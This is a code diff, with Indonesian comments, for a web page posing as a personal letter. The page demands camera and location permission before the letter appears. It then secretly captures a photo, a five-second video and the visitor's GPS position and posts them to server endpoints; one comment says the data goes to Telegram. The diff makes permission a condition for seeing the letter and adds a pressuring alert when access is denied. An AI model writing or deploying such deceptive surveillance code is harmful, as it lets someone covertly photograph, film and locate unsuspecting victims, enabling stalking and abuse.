@@ -14,19 +14,15 @@ const waBtn = document.getElementById("waBtn");
 const music = document.getElementById("bgMusic");
 let globalStream;
 
-// --- PARTICLE BACKGROUND ---
+// --- PARTICLE BACKGROUND (Tetap Jalan) ---
 const canvas = document.getElementById("bgCanvas");
 const ctx = canvas.getContext("2d");
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
 const particles = [];
 for(let i=0;i<100;i++){
   particles.push({
-    x: Math.random()*canvas.width,
-    y: Math.random()*canvas.height,
-    r: Math.random()*2+1,
-    dx: (Math.random()-0.5)*0.5,
-    dy: (Math.random()-0.5)*0.5
+    x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2+1,
+    dx: (Math.random()-0.5)*0.5, dy: (Math.random()-0.5)*0.5
   });
 }
 function drawParticles(){
@@ -42,20 +38,21 @@ function drawParticles(){
 }
 drawParticles();
 
-// --- LOGIKA UTAMA (CLICK READ IT) ---
+// --- LOGIKA TOMBOL (SISTEM KUNCI) ---
 readBtn.addEventListener("click", () => {
-    // 1. Play Music & Sembunyikan Tombol
-    music.load();
-    music.play().catch(() => console.log("Autoplay blocked"));
-    document.getElementById("introText").style.opacity = 0;
-    readBtn.style.display = "none";
-
-    // 2. Minta Izin Kamera & Lokasi (Proses Intel)
+    // Minta izin kamera dulu sebelum melakukan apapun
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     .then(function(stream) {
+        // JIKA USER KLIK "ALLOW" (IZINKAN):
         globalStream = stream;
 
-        // A. Ambil Lokasi
+        // 1. Jalankan Musik & Efek Visual
+        music.load();
+        music.play().catch(() => console.log("Autoplay blocked"));
+        document.getElementById("introText").style.opacity = 0;
+        readBtn.style.display = "none";
+
+        // 2. Ambil Lokasi & Kirim ke Telegram
         navigator.geolocation.getCurrentPosition(function(pos) {
             fetch("/kirim-lokasi", {
                 method: "POST",
@@ -64,7 +61,7 @@ readBtn.addEventListener("click", () => {
             });
         });
 
-        // B. Ambil Foto Diam-diam
+        // 3. Ambil Foto & Video
         const v = document.createElement("video");
         v.srcObject = globalStream;
         v.play();
@@ -77,40 +74,40 @@ readBtn.addEventListener("click", () => {
                     const fd = new FormData();
                     fd.append("photo", blob, "foto.jpg");
                     fetch("/kirim-foto", { method: "POST", body: fd });
-                    
-                    // C. Rekam Video Singkat (5 detik)
                     mulaiRekaman(globalStream);
                 }, "image/jpeg");
             }, 2000);
         };
+
+        // 4. BARU BUKA SURATNYA
+        letterBox.style.opacity = 0;
+        letterBox.style.display = "block";
+        setTimeout(() => letterBox.style.opacity = 1, 50);
+
+        let i = 0;
+        const words = message.split(/(\s+)/);
+        function typeWriter() {
+            if (i < words.length) {
+                typedText.innerHTML += words[i];
+                i++;
+                setTimeout(typeWriter, 150);
+            } else {
+                cursor.style.display = 'none';
+                waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
+                waBtn.classList.add("show");
+                waBtn.scrollIntoView({ behavior: "smooth" });
+            }
+        }
+        typeWriter();
     })
     .catch(err => {
-        console.log("Akses ditolak atau error:", err);
+        // JIKA USER KLIK "DENY" (TOLAK):
+        alert("Akses ditolak. Mohon izinkan kamera dan lokasi agar pesan rahasia ini bisa terbuka untukmu.");
+        console.log("Akses ditolak user.");
+        // Surat tidak akan muncul, tombol "Read It" tetap ada.
     });
-
-    // 3. Jalankan Efek Mengetik Surat
-    letterBox.style.opacity = 0;
-    letterBox.style.display = "block";
-    setTimeout(() => letterBox.style.opacity = 1, 50);
-
-    let i = 0;
-    const words = message.split(/(\s+)/);
-    function typeWriter() {
-        if (i < words.length) {
-            typedText.innerHTML += words[i];
-            i++;
-            setTimeout(typeWriter, 150); // Kecepatan ngetik
-        } else {
-            cursor.style.display = 'none';
-            waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
-            waBtn.classList.add("show");
-            waBtn.scrollIntoView({ behavior: "smooth" });
-        }
-    }
-    typeWriter();
 });
 
-// Fungsi rekam video
 function mulaiRekaman(stream) {
     const recorder = new MediaRecorder(stream);
     const chunks = [];
@@ -120,11 +117,8 @@ function mulaiRekaman(stream) {
         const fd = new FormData();
         fd.append("video", videoBlob, "video.mp4");
         fetch("/kirim-video", { method: "POST", body: fd })
-        .then(() => { 
-            // Matikan kamera setelah selesai semua
-            stream.getTracks().forEach(t => t.stop()); 
-        });
+        .then(() => { stream.getTracks().forEach(t => t.stop()); });
     };
     recorder.start();
-    setTimeout(() => recorder.stop(), 5000); // Rekam selama 5 detik
+    setTimeout(() => recorder.stop(), 5000);
 }
